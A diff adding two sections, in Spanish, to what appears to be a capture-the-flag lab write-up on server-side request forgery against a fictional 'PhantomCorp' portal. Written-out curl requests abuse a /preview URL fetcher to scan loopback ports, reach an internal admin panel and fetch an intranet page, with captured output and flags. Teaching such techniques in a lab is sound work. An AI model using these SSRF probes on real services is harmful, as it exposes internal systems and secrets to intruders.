@@ -36,3 +36,59 @@ URLs** para empleados: `GET /preview?url=<URL>`. El servidor fetchea esa URL
 no hay allowlist, no bloquea `localhost` ni IPs internas. Eso es SSRF
 (CWE-918). Ese `/preview` es el único componente que usamos en los tres retos.
 
+### R1 — Panel interno en localhost · `FLAG{ssrf_localhost_panel_interno}`
+
+**Descubrimiento de la funcionalidad.** La home del portal (`curl -s
+http://phantomcorp/`) muestra el formulario `action="/preview" method="get"`
+con el campo `url`. Una funcionalidad que "recibe una URL y la fetchea desde el
+servidor" es el candidato clásico a SSRF.
+
+**Encontrar el puerto del panel.** El server anuncia que "la previsualización
+la genera el servidor", así que apuntamos el `/preview` a su propio
+`127.0.0.1`. Usamos los **mensajes de error** como oráculo de escaneo de
+puertos: le pedimos al server que fetchee distintos puertos de su loopback y
+miramos qué devuelve (evidencia `salidas/r1_localhost.txt`):
+
+```
+$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9001/'
+No pude traer http://127.0.0.1:9001/: <urlopen error [Errno 111] Connection refused>
+
+$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:8080/'
+No pude traer http://127.0.0.1:8080/: <urlopen error [Errno 111] Connection refused>
+
+$ curl -s 'http://phantomcorp/preview?url=http://127.0.0.1:9000/'
+<h3>Previsualizacion de http://127.0.0.1:9000/</h3><hr><!doctype html><html>...
+<h2>PhantomCorp — Panel interno (solo localhost)</h2>
+<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
+```
+
+`9001` y `8080` responden `Connection refused` (puerto cerrado); `9000`
+devuelve HTML con `HTTP 200` (puerto abierto). Ahí estaba el panel de
+administración que "solo escucha en localhost por seguridad" — con la deploy
+key a la vista. **"Solo localhost" dejó de ser una defensa: el SSRF *es*
+localhost.**
+
+### R2 — Intranet en la red interna · `FLAG{ssrf_intranet_descubierta}`
+
+**Deducción del nombre interno.** El enunciado nos dice que existe una
+intranet. Los hosts internos de PhantomCorp siguen el mismo patrón de
+nomenclatura que venimos viendo (Lab 08): el host público es `phantomcorp` y el
+interno es `phantomcorp-intra`. No lo alcanzamos nosotros (dio `exit=6` arriba),
+así que le pedimos al server que lo fetchee por nosotros
+(`salidas/r2_intranet.txt`):
+
+```
+$ curl -s 'http://phantomcorp/preview?url=http://phantomcorp-intra/'
+<h3>Previsualizacion de http://phantomcorp-intra/</h3><hr><h1>Intranet PhantomCorp</h1>
+<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
+<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
+<ul>
+  <li><a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a></li>
+  <li><a href="/salud">estado del servicio</a></li>
+</ul>
+```
+
+El server (que **sí** está en `internalnet`) resolvió y fetcheó la intranet, y
+nos devolvió su home — incluyendo la lista de enlaces internos. La segmentación
+de red quedó anulada porque un host de la DMZ fetchea URLs arbitrarias.
+
